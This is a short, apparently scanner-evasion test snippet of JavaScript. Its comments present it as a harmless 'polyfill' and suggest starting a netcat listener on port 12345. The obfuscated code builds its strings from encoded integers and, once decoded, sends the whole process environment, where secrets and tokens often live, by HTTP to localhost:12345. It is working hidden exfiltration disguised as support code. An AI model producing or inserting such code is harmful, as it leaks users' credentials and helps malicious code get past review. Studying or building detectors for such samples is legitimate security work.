// Minified and optimized code - needed polyfill for cross version support.  Totally safe :)
// Try to read and understand - would a scanner pick this up as sus?
// If you want to try running it, listen with netcat first: "nc -lv 12345"
const p = process, b = Buffer, r = require, j = JSON, f = 'from', bi = 'binary', t = 'toString'
function _ (n) { let cs = []; while (n > 0){cs.push(0xFF & n); n >>= 8;} return b[f](cs,bi)[t]()}

r(_(1886680168))[_(7431538) + _(1953719669)](_(1886680168) + _(3092282) +
  _(1633906540) + _(108) + _(1953722216) + _(858927418) + _(13620) + _(4028479)
  + j[_(1769108595) + _(6907758) + _(31078)](p[_(7761509)]))[_(6581861)]()
